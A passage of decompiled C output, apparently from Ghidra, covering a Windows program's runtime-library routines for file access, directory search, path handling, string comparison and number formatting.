  local_8 = param_1;
  uVar1 = FUN_00408744(param_1,&local_14);
  if ((char)uVar1 == '\0') {
    FUN_004073d0();
    iVar2 = FUN_00404dd4((int)DAT_00419780);
    uVar1 = FUN_00407460(DAT_00419780,iVar2,extraout_ECX,(int)puVar3);
    if ((char)uVar1 == '\0') {
      iVar2 = FUN_00404dd4((int)DAT_00419784);
      uVar1 = FUN_00407460(DAT_00419784,iVar2,extraout_ECX_00,(int)puVar4);
      if ((char)uVar1 != '\0') {
        *param_2 = 0;
      }
    }
    else {
      *param_2 = 1;
    }
  }
  else {
    *param_2 = local_14 != (float10)_DAT_0040751c;
  }
  return uVar1;
}



void FUN_00407538(byte param_1,char param_2,int *param_3)

{
  if (param_2 == '\0') {
    FUN_004040b0(param_3,(undefined4 *)(&PTR_DAT_00418138)[param_1]);
  }
  else {
    FUN_004073d0();
    if (param_1 == 0) {
      FUN_004040b0(param_3,(undefined4 *)*DAT_00419784);
      return;
    }
    FUN_004040b0(param_3,(undefined4 *)*DAT_00419780);
  }
  return;
}



HANDLE FUN_00407584(undefined *param_1,uint param_2)

{
  HANDLE pvVar1;
  LPCSTR lpFileName;
  DWORD dwDesiredAccess;
  DWORD dwShareMode;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  DWORD dwCreationDisposition;
  DWORD dwFlagsAndAttributes;
  
  pvVar1 = (HANDLE)0xffffffff;
  if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {
    pvVar1 = (HANDLE)0x0;
    dwFlagsAndAttributes = 0x80;
    dwCreationDisposition = 3;
    lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
    dwShareMode = *(DWORD *)(&DAT_0041814c + ((param_2 & 0xf0) >> 4) * 4);
    dwDesiredAccess = *(DWORD *)(&DAT_00418140 + (param_2 & 3) * 4);
    lpFileName = FUN_004044f8(param_1);
    pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                         dwCreationDisposition,dwFlagsAndAttributes,pvVar1);
  }
  return pvVar1;
}



void FUN_004075dc(undefined *param_1)

{
  LPCSTR lpFileName;
  DWORD dwDesiredAccess;
  DWORD dwShareMode;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  DWORD dwCreationDisposition;
  DWORD dwFlagsAndAttributes;
  HANDLE hTemplateFile;
  
  hTemplateFile = (HANDLE)0x0;
  dwFlagsAndAttributes = 0x80;
  dwCreationDisposition = 2;
  lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  dwShareMode = 0;
  dwDesiredAccess = 0xc0000000;
  lpFileName = FUN_004044f8(param_1);
  CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,
              dwFlagsAndAttributes,hTemplateFile);
  return;
}



void FUN_00407600(undefined *param_1)

{
  FUN_004075dc(param_1);
  return;
}



DWORD FUN_00407608(HANDLE param_1,LPVOID param_2,DWORD param_3)

{
  BOOL BVar1;
  DWORD local_10;
  
  local_10 = param_3;
  BVar1 = ReadFile(param_1,param_2,param_3,&local_10,(LPOVERLAPPED)0x0);
  if (BVar1 == 0) {
    local_10 = 0xffffffff;
  }
  return local_10;
}



DWORD FUN_00407634(HANDLE param_1,LPCVOID param_2,DWORD param_3)

{
  BOOL BVar1;
  DWORD local_10;
  
  local_10 = param_3;
  BVar1 = WriteFile(param_1,param_2,param_3,&local_10,(LPOVERLAPPED)0x0);
  if (BVar1 == 0) {
    local_10 = 0xffffffff;
  }
  return local_10;
}



DWORD FUN_00407660(HANDLE param_1,DWORD param_2,undefined4 param_3,LONG param_4,LONG param_5)

{
  DWORD DVar1;
  LONG local_8;
  
  local_8 = param_5;
  DVar1 = SetFilePointer(param_1,param_4,&local_8,param_2);
  return DVar1;
}



void FUN_00407698(HANDLE param_1)

{
  CloseHandle(param_1);
  return;
}



undefined4 FUN_004076a0(undefined *param_1)

{
  LPCSTR lpFileName;
  HANDLE hFindFile;
  BOOL BVar1;
  LPWIN32_FIND_DATAA lpFindFileData;
  byte local_150;
  FILETIME local_13c [37];
  _FILETIME local_10;
  undefined4 local_8;
  
  lpFindFileData = (LPWIN32_FIND_DATAA)&local_150;
  lpFileName = FUN_004044f8(param_1);
  hFindFile = FindFirstFileA(lpFileName,lpFindFileData);
  if ((hFindFile != (HANDLE)0xffffffff) && (FindClose(hFindFile), (local_150 & 0x10) == 0)) {
    FileTimeToLocalFileTime(local_13c,&local_10);
    BVar1 = FileTimeToDosDateTime(&local_10,(LPWORD)((int)&local_8 + 2),(LPWORD)&local_8);
    if (BVar1 != 0) {
      return local_8;
    }
  }
  return 0xffffffff;
}



undefined4 FUN_00407708(undefined *param_1)

{
  int iVar1;
  
  iVar1 = FUN_004076a0(param_1);
  return CONCAT31((int3)((uint)(iVar1 + 1) >> 8),iVar1 + 1 != 0);
}



undefined4 FUN_00407718(undefined *param_1)

{
  LPCSTR lpFileName;
  DWORD DVar1;
  
  lpFileName = FUN_004044f8(param_1);
  DVar1 = GetFileAttributesA(lpFileName);
  if ((DVar1 != 0xffffffff) && ((DVar1 & 0x10) != 0)) {
    return CONCAT31((int3)(DVar1 >> 8),1);
  }
  return 0;
}



DWORD FUN_0040773c(LPWORD param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  _FILETIME local_c;
  
  do {
    if ((*(uint *)(param_1 + 0xc) & *(uint *)(param_1 + 8)) == 0) {
      FileTimeToLocalFileTime((FILETIME *)(param_1 + 0x16),&local_c);
      FileTimeToDosDateTime(&local_c,param_1 + 1,param_1);
      *(undefined4 *)(param_1 + 2) = *(undefined4 *)(param_1 + 0x1c);
      *(undefined4 *)(param_1 + 4) = *(undefined4 *)(param_1 + 0xc);
      FUN_004042cc((int *)(param_1 + 6),(undefined4 *)(param_1 + 0x22),0x104);
      return 0;
    }
    BVar1 = FindNextFileA(*(HANDLE *)(param_1 + 10),(LPWIN32_FIND_DATAA)(param_1 + 0xc));
  } while (BVar1 != 0);
  DVar2 = GetLastError();
  return DVar2;
}



DWORD FUN_004077a0(undefined *param_1,uint param_2,LPWORD param_3)

{
  LPCSTR lpFileName;
  HANDLE pvVar1;
  DWORD DVar2;
  LPWIN32_FIND_DATAA lpFindFileData;
  
  *(uint *)(param_3 + 8) = ~param_2 & 0x1e;
  lpFindFileData = (LPWIN32_FIND_DATAA)(param_3 + 0xc);
  lpFileName = FUN_004044f8(param_1);
  pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
  *(HANDLE *)(param_3 + 10) = pvVar1;
  if (pvVar1 == (HANDLE)0xffffffff) {
    DVar2 = GetLastError();
  }
  else {
    DVar2 = FUN_0040773c(param_3);
    if (DVar2 != 0) {
      FUN_00407814((int)param_3);
    }
  }
  return DVar2;
}



void FUN_004077f0(LPWORD param_1)

{
  BOOL BVar1;
  
  BVar1 = FindNextFileA(*(HANDLE *)(param_1 + 10),(LPWIN32_FIND_DATAA)(param_1 + 0xc));
  if (BVar1 != 0) {
    FUN_0040773c(param_1);
    return;
  }
  GetLastError();
  return;
}



void FUN_00407814(int param_1)

{
  if (*(HANDLE *)(param_1 + 0x14) != (HANDLE)0xffffffff) {
    FindClose(*(HANDLE *)(param_1 + 0x14));
    *(undefined4 *)(param_1 + 0x14) = 0xffffffff;
  }
  return;
}



int FUN_00407830(undefined *param_1,undefined *param_2)

{
  int iVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 uVar4;
  
  iVar1 = FUN_004042f8((int)param_2);
  pcVar2 = FUN_004044f8(param_1);
  do {
    if (iVar1 < 1) {
      return iVar1;
    }
    if ((param_2[iVar1 + -1] != '\0') &&
       (pcVar3 = thunk_FUN_00407ada(pcVar2,param_2[iVar1 + -1]), pcVar3 != (char *)0x0)) {
      uVar4 = FUN_0040b1a0(param_2,iVar1);
      if ((char)uVar4 != '\x02') {
        return iVar1;
      }
      iVar1 = iVar1 + -1;
    }
    iVar1 = iVar1 + -1;
  } while( true );
}



void FUN_00407880(undefined *param_1,int *param_2)

{
  uint uVar1;
  
  uVar1 = FUN_00407830(&DAT_004078b0,param_1);
  FUN_00404558((int)param_1,1,uVar1,param_2);
  return;
}



void FUN_004078b4(undefined *param_1,int *param_2)

{
  bool bVar1;
  uint uVar2;
  
  uVar2 = FUN_00407830(&DAT_00407904,param_1);
  if ((1 < (int)uVar2) && (param_1[uVar2 - 1] == '\\')) {
    bVar1 = FUN_0040b450(&DAT_00407904,param_1,uVar2 - 1);
    if (!bVar1) {
      uVar2 = uVar2 - 1;
    }
  }
  FUN_00404558((int)param_1,1,uVar2,param_2);
  return;
}



void FUN_00407908(undefined *param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = FUN_00407830(&DAT_0040793c,param_1);
  FUN_00404558((int)param_1,iVar1 + 1,0x7fffffff,param_2);
  return;
}



void FUN_00407940(undefined *param_1,int *param_2)

{
  LPCSTR lpFileName;
  DWORD DVar1;
  undefined4 *lpBuffer;
  LPSTR *lpFilePart;
  LPSTR pCStack_110;
  undefined4 local_10c [65];
  
  lpFilePart = &pCStack_110;
  lpBuffer = local_10c;
  DVar1 = 0x104;
  lpFileName = FUN_004044f8(param_1);
  DVar1 = GetFullPathNameA(lpFileName,DVar1,(LPSTR)lpBuffer,lpFilePart);
  FUN_0040414c(param_2,local_10c,DVar1);
  return;
}



void FUN_004079f0(int *param_1)

{
  FUN_004027f8('\0',param_1);
  return;
}



bool FUN_004079fc(undefined *param_1)

{
  LPCSTR lpPathName;
  BOOL BVar1;
  
  lpPathName = FUN_004044f8(param_1);
  BVar1 = SetCurrentDirectoryA(lpPathName);
  return (bool)('\x01' - (BVar1 == 0));
}



bool FUN_00407a14(undefined *param_1)

{
  LPCSTR lpPathName;
  BOOL BVar1;
  LPSECURITY_ATTRIBUTES lpSecurityAttributes;
  
  lpSecurityAttributes = (LPSECURITY_ATTRIBUTES)0x0;
  lpPathName = FUN_004044f8(param_1);
  BVar1 = CreateDirectoryA(lpPathName,lpSecurityAttributes);
  return (bool)('\x01' - (BVar1 == 0));
}



int FUN_00407a30(char *param_1)

{
  char cVar1;
  int iVar2;
  
  iVar2 = -1;
  do {
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    cVar1 = *param_1;
    param_1 = param_1 + 1;
  } while (cVar1 != '\0');
  return -2 - iVar2;
}



undefined4 * FUN_00407a48(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  FUN_00402890(param_2,param_1,param_3);
  return param_1;
}



undefined4 * FUN_00407a58(undefined4 *param_1,undefined4 *param_2,int param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  bool bVar4;
  
  bVar4 = param_3 == 0;
  iVar1 = param_3;
  puVar3 = param_2;
  if (!bVar4) {
    do {
      if (iVar1 == 0) break;
      iVar1 = iVar1 + -1;
      bVar4 = *(char *)puVar3 == '\0';
      puVar3 = (undefined4 *)((int)puVar3 + 1);
    } while (!bVar4);
    if (bVar4) {
      iVar1 = iVar1 + 1;
    }
  }
  puVar3 = param_1;
  for (uVar2 = (uint)(param_3 - iVar1) >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
    *puVar3 = *param_2;
    param_2 = param_2 + 1;
    puVar3 = puVar3 + 1;
  }
  for (uVar2 = param_3 - iVar1 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
    *(undefined *)puVar3 = *(undefined *)param_2;
    param_2 = (undefined4 *)((int)param_2 + 1);
    puVar3 = (undefined4 *)((int)puVar3 + 1);
  }
  *(undefined *)puVar3 = 0;
  return param_1;
}



void FUN_00407a8c(char *param_1,char *param_2,int param_3)

{
  char *pcVar1;
  char cVar2;
  byte bVar3;
  int iVar4;
  undefined3 uVar5;
  int iVar6;
  uint uVar7;
  char *pcVar8;
  bool bVar9;
  
  iVar4 = 0;
  iVar6 = param_3;
  pcVar8 = param_2;
  if (param_3 != 0) {
    do {
      if (iVar6 == 0) break;
      iVar6 = iVar6 + -1;
      cVar2 = *pcVar8;
      pcVar8 = pcVar8 + 1;
    } while (cVar2 != '\0');
    iVar6 = param_3 - iVar6;
    bVar9 = true;
LAB_00407aa5:
    do {
      if (iVar6 != 0) {
        iVar6 = iVar6 + -1;
        pcVar1 = param_2 + 1;
        pcVar8 = param_1 + 1;
        bVar9 = *param_1 == *param_2;
        param_1 = pcVar8;
        param_2 = pcVar1;
        if (bVar9) goto LAB_00407aa5;
      }
      if (bVar9) {
        return;
      }
      bVar3 = param_1[-1];
      uVar5 = (undefined3)((uint)iVar4 >> 8);
      iVar4 = CONCAT31(uVar5,bVar3);
      if ((0x60 < bVar3) && (bVar3 < 0x7b)) {
        iVar4 = CONCAT31(uVar5,bVar3 - 0x20);
      }
      bVar3 = param_2[-1];
      uVar7 = (uint)bVar3;
      if ((0x60 < bVar3) && (bVar3 < 0x7b)) {
        uVar7 = (uint)(byte)(bVar3 - 0x20);
      }
      iVar4 = iVar4 - uVar7;
      bVar9 = iVar4 == 0;
    } while (bVar9);
  }
  return;
}



char * thunk_FUN_00407ada(char *param_1,char param_2)

{
  while( true ) {
    if (param_2 == *param_1) {
      return param_1;
    }
    if (*param_1 == '\0') break;
    param_1 = param_1 + 1;
  }
  return (char *)0x0;
}



char * FUN_00407ada(char *param_1,char param_2)

{
  while( true ) {
    if (param_2 == *param_1) {
      return param_1;
    }
    if (*param_1 == '\0') break;
    param_1 = param_1 + 1;
  }
  return (char *)0x0;
}



char * FUN_00407ae4(char *param_1,char *param_2)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  char *pcVar7;
  char *pcVar8;
  bool bVar9;
  
  if ((param_1 != (char *)0x0) && (param_2 != (char *)0x0)) {
    uVar2 = 0xffffffff;
    pcVar7 = param_2;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar7 + 1;
    } while (cVar1 != '\0');
    uVar3 = ~uVar2 - 1;
    if (uVar3 != 0) {
      uVar4 = 0xffffffff;
      pcVar7 = param_1;
      do {
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        cVar1 = *pcVar7;
        pcVar7 = pcVar7 + 1;
      } while (cVar1 != '\0');
      iVar5 = ~uVar4 - uVar3;
      bVar9 = iVar5 == 0;
      if (uVar3 <= ~uVar4 && !bVar9) {
        do {
          pcVar7 = param_2 + 1;
          pcVar8 = param_1;
          do {
            param_1 = pcVar8;
            if (iVar5 == 0) break;
            iVar5 = iVar5 + -1;
            param_1 = pcVar8 + 1;
            bVar9 = *param_2 == *pcVar8;
            pcVar8 = param_1;
          } while (!bVar9);
          iVar6 = ~uVar2 - 2;
          pcVar8 = param_1;
          if (!bVar9) {
            return (char *)0x0;
          }
          do {
            if (iVar6 == 0) break;
            bVar9 = *pcVar7 == *pcVar8;
            iVar6 = iVar6 + -1;
            pcVar8 = pcVar8 + 1;
            pcVar7 = pcVar7 + 1;
          } while (bVar9);
          if (bVar9) {
            return param_1 + -1;
          }
        } while( true );
      }
    }
  }
  return (char *)0x0;
}



int * FUN_00407b38(int param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_00402690(param_1 + 4);
  *piVar1 = param_1 + 4;
  return piVar1 + 1;
}



undefined4 * FUN_00407b4c(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 *puVar3;
  
  if (param_1 == (undefined4 *)0x0) {
    return (undefined4 *)0x0;
  }
  iVar1 = FUN_00407a30((char *)param_1);
  piVar2 = FUN_00407b38(iVar1 + 1U);
  puVar3 = FUN_00407a48(piVar2,param_1,iVar1 + 1U);
  return puVar3;
}



void FUN_00407b78(int param_1,undefined4 *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined uStack_35;
  undefined4 auStack_34 [8];
  undefined *local_14;
  undefined local_10;
  
  if (0x1f < param_3) {
    param_3 = 0x1f;
  }
  uVar1 = FUN_0040b1c4((byte *)param_2,param_3 - 1);
  if ((char)uVar1 == '\x01') {
    param_3 = param_3 - 1;
  }
  FUN_00407a48((undefined4 *)(&uStack_35 + 1),param_2,param_3);
  (&uStack_35)[param_3 + 1] = 0;
  local_10 = 6;
  local_14 = &uStack_35 + 1;
  FUN_00407004((int **)(&PTR_PTR_DAT_00418160)[param_1],&local_14,0);
  return;
}



void FUN_00407bf4(int *param_1)

{
  FUN_0040405c(param_1);
  return;
}



void FUN_00407c00(byte *param_1,byte *param_2,byte *param_3,undefined4 param_4,undefined4 param_5,
                 int param_6)

{
  byte bVar1;
  char cVar2;
  uint uVar3;
  undefined3 uVar5;
  undefined4 uVar4;
  byte *pbVar6;
  byte *extraout_ECX;
  byte *extraout_ECX_00;
  byte *extraout_ECX_01;
  byte *extraout_EDX;
  byte *extraout_EDX_00;
  byte *pbVar7;
  byte *pbVar8;
  byte *pbVar9;
  byte *pbVar10;
  byte *pbVar11;
  bool bVar12;
  byte bVar13;
  int local_14;
  byte *local_10;
  byte *local_c;
  undefined4 local_8;
  
  bVar13 = 0;
  local_8 = 0;
  pbVar6 = param_3 + param_6;
  uVar3 = 0;
  local_10 = (byte *)0x0;
  local_14 = 0;
  local_c = param_1;
LAB_00407c29:
  if (param_2 != (byte *)0x0) {
    do {
      if (param_3 == pbVar6) break;
      pbVar9 = param_3 + (uint)bVar13 * -2 + 1;
      bVar1 = *param_3;
      uVar5 = (undefined3)(uVar3 >> 8);
      uVar3 = CONCAT31(uVar5,bVar1);
      param_3 = pbVar9;
      if (bVar1 == 0x25) {
        if (pbVar9 == pbVar6) break;
        param_3 = pbVar9 + (uint)bVar13 * -2 + 1;
        uVar3 = CONCAT31(uVar5,*pbVar9);
        if (*pbVar9 != 0x25) goto code_r0x00407c4d;
      }
      pbVar9 = param_1 + (uint)bVar13 * -2 + 1;
      *param_1 = (byte)uVar3;
      param_2 = param_2 + -1;
      param_1 = pbVar9;
      if (param_2 == (byte *)0x0) break;
    } while( true );
  }
LAB_00407c3a:
  FUN_00407f67((int)param_1 - (int)local_c);
  return;
code_r0x00407c4d:
  pbVar9 = param_3 + -2;
  while( true ) {
    cVar2 = (char)uVar3;
    pbVar10 = param_3;
    if (cVar2 == '-') {
      if (param_3 == pbVar6) goto LAB_00407c3a;
      pbVar10 = param_3 + (uint)bVar13 * -2 + 1;
      uVar3 = CONCAT31((int3)(uVar3 >> 8),*param_3);
    }
    uVar3 = FUN_00407ce2(uVar3,param_2,pbVar6);
    uVar5 = (undefined3)(uVar3 >> 8);
    pbVar6 = extraout_ECX;
    if ((char)uVar3 != ':') break;
    local_10 = pbVar9;
    if (pbVar10 == extraout_ECX) goto LAB_00407c3a;
    param_3 = pbVar10 + (uint)bVar13 * -2 + 1;
    uVar3 = CONCAT31(uVar5,*pbVar10);
    param_2 = extraout_EDX;
  }
  pbVar7 = extraout_EDX;
  param_3 = pbVar10;
  if ((char)uVar3 == '.') {
    if (pbVar10 == extraout_ECX) goto LAB_00407c3a;
    param_3 = pbVar10 + (uint)bVar13 * -2 + 1;
    uVar3 = FUN_00407ce2(CONCAT31(uVar5,*pbVar10),extraout_EDX,extraout_ECX);
    pbVar6 = extraout_ECX_00;
    pbVar7 = extraout_EDX_00;
  }
  uVar4 = FUN_00407d2a((char)uVar3,pbVar7,pbVar6);
  pbVar9 = pbVar9 + -(int)extraout_ECX_01;
  if (pbVar9 < extraout_ECX_01) {
    pbVar9 = (byte *)0x0;
  }
  pbVar10 = extraout_ECX_01;
  pbVar11 = param_3;
  if (cVar2 == '-') {
    bVar12 = pbVar7 < extraout_ECX_01;
    pbVar7 = pbVar7 + -(int)extraout_ECX_01;
    if (bVar12) {
      pbVar10 = extraout_ECX_01 + (int)pbVar7;
      pbVar7 = (byte *)0x0;
    }
    for (; pbVar10 != (byte *)0x0; pbVar10 = pbVar10 + -1) {
      *param_1 = *pbVar11;
      pbVar11 = pbVar11 + (uint)bVar13 * -2 + 1;
      param_1 = param_1 + (uint)bVar13 * -2 + 1;
    }
  }
  pbVar8 = pbVar7 + -(int)pbVar9;
  if (pbVar7 < pbVar9) {
    pbVar9 = pbVar9 + (int)pbVar8;
    pbVar8 = (byte *)0x0;
  }
  uVar3 = CONCAT31((int3)((uint)uVar4 >> 8),0x20);
  for (; pbVar9 != (byte *)0x0; pbVar9 = pbVar9 + -1) {
    *param_1 = 0x20;
    param_1 = param_1 + (uint)bVar13 * -2 + 1;
  }
  param_2 = pbVar8 + -(int)pbVar10;
  if (pbVar8 < pbVar10) {
    pbVar10 = pbVar10 + (int)param_2;
    param_2 = (byte *)0x0;
  }
  for (; pbVar10 != (byte *)0x0; pbVar10 = pbVar10 + -1) {
    *param_1 = *pbVar11;
    pbVar11 = pbVar11 + (uint)bVar13 * -2 + 1;
    param_1 = param_1 + (uint)bVar13 * -2 + 1;
  }
  if (local_14 != 0) {
    uVar3 = FUN_00407bf4(&local_14);
  }
  goto LAB_00407c29;
}



uint FUN_00407ce2(uint param_1,undefined4 param_2,byte *param_3)

{
  int iVar1;
  uint uVar2;
  int unaff_EBP;
  byte *unaff_ESI;
  int unaff_EDI;
  
  if ((char)param_1 == '*') {
    iVar1 = *(int *)(unaff_EBP + -0xc);
    if (iVar1 <= *(int *)(unaff_EBP + 8)) {
      *(int *)(unaff_EBP + -0xc) = *(int *)(unaff_EBP + -0xc) + 1;
    }
    if (unaff_ESI == param_3) {
LAB_00407c3a:
      uVar2 = FUN_00407f67(unaff_EDI - *(int *)(unaff_EBP + -8));
      return uVar2;
    }
    param_1 = CONCAT31((int3)((uint)iVar1 >> 8),*unaff_ESI);
  }
  else {
    while ((0x2f < (byte)param_1 && ((byte)param_1 < 0x3a))) {
      if (unaff_ESI == param_3) goto LAB_00407c3a;
      param_1 = (uint)*unaff_ESI;
      unaff_ESI = unaff_ESI + 1;
    }
  }
  return param_1;
}



void FUN_00407d2a(undefined param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *puVar1;
  float10 fVar2;
  int iVar3;
  byte bVar4;
  undefined4 uVar5;
  int iVar6;
  ulonglong *puVar7;
  char cVar8;
  short sVar10;
  uint uVar11;
  undefined4 extraout_ECX;
  undefined3 uVar12;
  uint uVar13;
  int unaff_EBP;
  byte *pbVar14;
  float10 fVar15;
  float10 fVar16;
  float10 fVar17;
  int iStack_8;
  int iStack_4;
  char cVar9;
  
  uVar5 = 1;
  iVar6 = *(int *)(unaff_EBP + -0xc);
  if (iVar6 <= *(int *)(unaff_EBP + 8)) {
    *(int *)(unaff_EBP + -0xc) = *(int *)(unaff_EBP + -0xc) + 1;
    puVar1 = (undefined4 *)(*(int *)(unaff_EBP + 0xc) + iVar6 * 8);
    uVar13 = (uint)*(byte *)(puVar1 + 1);
                    // WARNING: Could not recover jumptable at 0x00407d4a. Too many branches
                    // WARNING: Treating indirect jump as call
    (**(code **)(&DAT_00407d51 + uVar13 * 4))
              (*puVar1,uVar13,CONCAT31((int3)((uint)param_3 >> 8),param_1) & 0xffffffdf);
    return;
  }
  while( true ) {
    iStack_4 = 0x407d9c;
    iVar6 = FUN_00407f57(uVar5);
    iStack_4 = 0x407dac;
    puVar7 = (ulonglong *)
             FUN_00407b78(iVar6,*(undefined4 **)(unaff_EBP + -0x18),
                          *(int *)(unaff_EBP + -0x28) - (int)*(undefined4 **)(unaff_EBP + -0x18));
    uVar13 = *(uint *)(unaff_EBP + -0x24);
    if (0x20 < uVar13) {
      uVar13 = 0;
    }
    cVar9 = (char)extraout_ECX;
    uVar12 = (undefined3)((uint)extraout_ECX >> 8);
    cVar8 = cVar9 + -0x44;
    if (cVar8 == '\0') break;
    cVar8 = '\x10';
    uVar12 = 0;
    if (cVar9 == 'X') break;
    cVar8 = '\n';
    uVar12 = 0;
    if (cVar9 == 'U') break;
    uVar5 = 0;
  }
  sVar10 = (short)CONCAT31(uVar12,cVar8);
  if ((cVar8 == '\0') && (sVar10 = 10, (*(uint *)((int)puVar7 + 4) & 0x80000000) != 0)) {
    iStack_8 = -*(int *)puVar7;
    iStack_4 = -(*(int *)((int)puVar7 + 4) + (uint)(*(int *)puVar7 != 0));
    FUN_004072b0((ulonglong *)&iStack_8,uVar13,10);
    *(undefined *)(unaff_EBP + -0x4a) = 0x2d;
    return;
  }
  fVar2 = (float10)1;
  if ((*(uint *)((int)puVar7 + 4) & 0x80000000) == 0) {
    fVar17 = (float10)*puVar7;
  }
  else {
    fVar17 = (float10)0x7fffffffffffffff + fVar2 + (float10)(*puVar7 & 0x7fffffffffffffff);
  }
  fVar15 = (float10)sVar10;
  pbVar14 = (byte *)(unaff_EBP + -0x49);
  do {
    pbVar14 = pbVar14 + -1;
    fVar16 = fVar17 - (fVar17 / fVar15) * fVar15;
    fVar17 = fVar17 / fVar15;
    iStack_8._0_1_ = (char)(short)ROUND(fVar16);
    bVar4 = (char)iStack_8 + 0x30;
    if (0x39 < bVar4) {
      bVar4 = (char)iStack_8 + 0x37;
    }
    *pbVar14 = bVar4;
  } while (fVar2 <= fVar17);
  ffree(fVar2);
  ffree(fVar17);
  ffree(fVar15);
  ffree(fVar17);
  uVar11 = (int)(byte *)(unaff_EBP + -0x49) - (int)pbVar14;
  iVar6 = uVar13 - uVar11;
  if (uVar11 <= uVar13 && iVar6 != 0) {
    iVar3 = -iVar6;
    while (iVar6 = iVar6 + -1, iVar6 != 0) {
      (pbVar14 + iVar3)[iVar6] = 0x30;
    }
    pbVar14[iVar3] = 0x30;
  }
  return;
}



undefined4 FUN_00407f57(undefined4 param_1)

{
  int unaff_EBP;
  
  FUN_0040405c((int *)(unaff_EBP + -0x14));
  return param_1;
}



void FUN_00407f67(undefined4 param_1)

{
  FUN_00407f57(param_1);
  return;
}



byte * FUN_00407f78(byte *param_1,byte *param_2,byte *param_3,undefined4 param_4,undefined4 param_5)

{
  int iVar1;
  
  if ((param_1 == (byte *)0x0) || (param_3 == (byte *)0x0)) {
    param_1 = (byte *)0x0;
  }
  else {
    iVar1 = FUN_00407a30((char *)param_3);
    iVar1 = FUN_00407c00(param_1,param_2,param_3,param_4,param_5,iVar1);
    param_1[iVar1] = 0;
  }
  return param_1;
}



void FUN_00407fb8(byte *param_1,undefined4 param_2,undefined4 param_3,byte **param_4)

{
  FUN_00407fcc(param_4,param_1,param_2,param_3);
  return;
}



void FUN_00407fcc(byte **param_1,byte *param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined4 local_100c [2];
  byte **ppbStack_1004;
  undefined4 local_c;
  byte *local_8;
  
  ppbStack_1004 = param_1;
  local_c = param_3;
  local_8 = param_2;
  iVar1 = FUN_004042f8((int)param_2);
  if (iVar1 < 0xc00) {
    iVar1 = FUN_004042f8((int)local_8);
    uVar2 = FUN_00407c00((byte *)local_100c,(byte *)0xfff,local_8,param_4,local_c,iVar1);
    uVar3 = 0x1000;
  }
  else {
    uVar2 = FUN_004042f8((int)local_8);
    uVar3 = uVar2;
  }
  if ((int)uVar2 < (int)(uVar3 - 1)) {
    FUN_0040414c((int *)param_1,local_100c,uVar2);
  }
  else {
    while ((int)(uVar3 - 1) <= (int)uVar2) {
      uVar3 = uVar3 * 2;
      FUN_0040405c((int *)param_1);
      FUN_00404628((int *)param_1,uVar3);
      iVar1 = FUN_004042f8((int)local_8);
      uVar2 = FUN_00407c00(*param_1,(byte *)(uVar3 - 1),local_8,param_4,local_c,iVar1);
    }
    FUN_00404628((int *)param_1,uVar2);
  }
  return;
}



uint FUN_0040808c(undefined4 param_1,uint param_2,int param_3)

{
  char cVar2;
  uint uVar1;
  char unaff_BL;
  uint *puVar3;
  undefined *unaff_EDI;
  char *pcVar4;
  uint local_8;
  
  *unaff_EDI = (char)param_1;
  if (unaff_BL == '\0') {
    param_2 = 0;
LAB_004080a2:
    cVar2 = (char)((uint)param_1 >> 8);
    pcVar4 = unaff_EDI + 1;
    if (cVar2 == '\0') goto LAB_004080a9;
  }
  else {
    if (-1 < (int)param_2) goto LAB_004080a2;
    cVar2 = '-';
    param_2 = -param_2;
  }
  pcVar4 = unaff_EDI + 2;
  unaff_EDI[1] = cVar2;
LAB_004080a9:
  puVar3 = &local_8;
  local_8 = param_2;
  do {
    do {
      uVar1 = param_2 / DAT_00418174;
      *(char *)puVar3 = (char)(param_2 % DAT_00418174) + '0';
      puVar3 = (uint *)((int)puVar3 + 1);
      param_3 = param_3 + -1;
      param_2 = uVar1;
    } while (uVar1 != 0);
  } while (0 < param_3);
  do {
    puVar3 = (uint *)((int)puVar3 + -1);
    *pcVar4 = *(char *)puVar3;
    pcVar4 = pcVar4 + 1;
  } while (puVar3 != &local_8);
  return local_8;
}



void FUN_004080d0(undefined *param_1,undefined4 param_2,char param_3,undefined4 param_4,int param_5,
                 byte param_6)

{
  int iVar1;
  int extraout_ECX;
  uint uVar2;
  undefined *puVar3;
  undefined *puVar4;
  byte bVar5;
  ushort local_30 [12];
  int local_18;
  undefined local_12;
  undefined local_11;
  undefined4 local_10;
  undefined local_a;
  undefined local_9;
  undefined *local_8;
  
  bVar5 = 0;
  local_9 = DAT_0041967f;
  local_a = DAT_0041967e;
  local_10 = DAT_00419678;
  local_11 = DAT_0041967c;
  local_12 = DAT_0041967d;
  local_18 = 0;
  iVar1 = 0x13;
  if (param_3 == '\0') {
    iVar1 = param_5;
    if (param_5 < 2) {
      iVar1 = 2;
    }
    if (0x12 < iVar1) {
      iVar1 = 0x12;
    }
  }
  local_8 = param_1;
  FUN_004083a4(local_30,param_2,param_3);
  puVar4 = local_8;
  if (local_30[0] - 0x7fff < 2) {
    FUN_004081cf();
    puVar3 = &DAT_004081c0 + local_18 + extraout_ECX * 3;
    for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
